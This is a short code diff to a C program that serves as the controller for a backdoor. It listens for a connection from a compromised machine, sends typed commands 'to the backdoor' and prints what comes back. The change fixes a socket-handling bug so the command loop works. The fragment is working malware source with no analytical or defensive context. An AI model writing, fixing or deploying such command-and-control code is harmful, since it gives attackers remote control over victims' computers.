@@ -32,7 +32,7 @@ int main() {
   // listen connections
   listen(sock, 5);
   client_length = sizeof(client);
-  client = accept(sock, (struct sockaddr *) &client, &client_length);
+  client_socket = accept(sock, (struct sockaddr *) &client, &client_length);
   // loop
   while(1) {
      jump:
@@ -45,12 +45,12 @@ int main() {
      // trimming characters
      strtok(buffer, "\n");
      // send command to the backdoor
-     write(client, buffer, sizeof(buffer));
+     write(client_socket, buffer, sizeof(buffer));
      if(strncmp("q", buffer, 1) == 0) {
        // quit command
        break;
      } else {
-       recv(client, response, sizeof(response), MSG_WAITALL); // block ops until the full request is done
+       recv(client_socket, response, sizeof(response), MSG_WAITALL); // block ops until the full request is done
        // printing response
        printf("%s", response);
      }
